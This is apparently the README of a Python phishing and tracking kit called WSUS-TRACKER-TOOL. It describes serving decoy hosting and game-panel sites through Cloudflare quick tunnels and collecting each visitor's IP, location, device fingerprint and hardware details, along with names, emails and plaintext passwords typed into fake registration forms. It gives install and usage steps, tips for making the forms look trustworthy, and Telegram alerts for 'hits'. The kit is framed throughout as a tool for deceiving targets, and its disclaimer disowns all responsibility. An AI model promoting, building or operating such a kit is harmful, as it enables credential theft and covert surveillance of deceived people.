<div align="center">

# WSUS-TRACKER-TOOL

**Terminal-driven browser detail tracker with decoy landing pages.**
One command, one `trycloudflare.com` link, a live feed of everything the target leaks.

![python](https://img.shields.io/badge/python-3.9%2B-3776AB?logo=python&logoColor=white)
![platform](https://img.shields.io/badge/platform-windows%20%7C%20linux%20%7C%20macos-lightgrey)
![license](https://img.shields.io/badge/license-MIT-green)

</div>

---

## What it is

A numbered console panel. You pick a fake site, it spins up a real HTTPS link through a Cloudflare quick tunnel, and when someone opens it you see their details appear in your terminal in real time — IP, geo, ISP, device, GPU, canvas hash, timezone, plus whatever they type into the "register" form.

Nothing to host. Nothing to sign up for. Runs from a laptop.

## Features

| | |
|---|---|
| **Numbered panel** | `1` tunnel · `2` theme · `3` link+QR · `4` live · `5` creds · `6` export · `7` dashboard · `8` settings |
| **3 decoy themes** | Free VPS host · Minecraft hosting · game control panel |
| **No-sus forms** | Realistic register flow, "verifying email…", fake provisioning bar, then redirect to a real host |
| **Network** | Real client IP via Cloudflare edge headers, IPv6, ASN, ISP, proxy/VPN flag |
| **Geo** | Country, region, city, postal, coordinates, flag |
| **Device** | OS + version, browser + version, device class, screen/avail/viewport, DPI, colour depth, orientation |
| **Hardware** | GPU vendor + renderer via WebGL, CPU cores, device RAM, battery level/state |
| **Fingerprint** | Canvas hash, installed-font probe, touch points, platform, vendor, cookie support |
| **Context** | Timezone + UTC offset, languages, referrer, landing path, time on page, devtools-open, tab focus/blur, mouse + keystroke counts |
| **Live ops** | Bell alert, colour-coded terminal feed, clipboard auto-copy, QR in terminal, session list, creds list |
| **Storage** | JSONL session log, `creds.txt`, CSV + JSON export |
| **Bonus** | Local web dashboard with token, Telegram push, auto-stop after N hits / N minutes, live theme switching |

## Requirements

- Python 3.9+
- Internet access (the tunnel + geo lookups need it)
- `cloudflared` — auto-downloaded on first run into `bin/`

## Install

```bash
git clone https://github.com/whitigergaming-design/WSUS-TRACKER-TOOL.git
cd WSUS-TRACKER-TOOL
pip install -r requirements.txt
```

Windows (PowerShell):

```powershell
git clone https://github.com/whitigergaming-design/WSUS-TRACKER-TOOL.git
cd WSUS-TRACKER-TOOL
python -m venv .venv; .\.venv\Scripts\Activate.ps1
pip install -r requirements.txt
python wst.py
```

## Usage

```bash
python wst.py
```

1. Press `2` — choose a theme (`1` free VPS, `2` Minecraft host, `3` game panel).
2. Press `1` — server + tunnel start. The link is printed and copied.
3. Send the link. Hits stream into the terminal.
4. `5` reviews credentials, `6` exports, `7` opens the dashboard.

Press `0` or `Ctrl+C` to shut everything down.

## Settings worth changing

| Key | Why |
|---|---|
| `redirect` | Where the victim lands after submitting. Match your theme (Hostinger, Aternos, Pterodactyl demo…). |
| `max_hits` | Auto-stop once you have enough. |
| `timeout_min` | Auto-stop after N minutes so the tunnel doesn't stay up. |
| `telegram_*` | Push hits to your phone. |

Settings persist in `data/settings.json`.

## Output

```
data/hits.jsonl     one JSON object per session, appended live
data/creds.txt      time | ip | name | email | password
data/export/        csv / json dumps
```

## Notes and limits

- The quick tunnel URL is random and dies when the process exits — restarting gives a new one.
- IP-based geo is only as accurate as the ISP; mobile CGNAT will show the carrier, not the user.
- Free geo endpoints are rate-limited (~45/min). Turn geo off in settings for high-volume runs.
- Passwords are captured in plaintext as typed — no way to verify them, so expect typos.
- Quick tunnels are not guaranteed to stay up for days. For long runs use a named tunnel with your own domain.
- macOS/Windows may prompt for firewall permission on first bind.

## Credits

- **whitiger** — original concept, structure and direction.
- Built and maintained by **whitigergaming-design**.
- [cloudflared](https://github.com/cloudflare/cloudflared) for the tunnels.
- [ipwho.is](https://ipwho.is) / [ip-api.com](https://ip-api.com) for geo.

## Disclaimer

This tool is provided as-is. It captures whatever a browser will hand over voluntarily, plus anything typed into the forms, and it does **not** bypass any authentication. Passwords are stored in plaintext locally.

**The author is not responsible for anything** — not for accuracy of the collected data, not for downtime, not for rate limits, not for how you use what you collect, and not for anything else. Use it at your own risk. If you need the data to be legally solid, verify it independently.

## License

MIT — see [LICENSE](LICENSE).
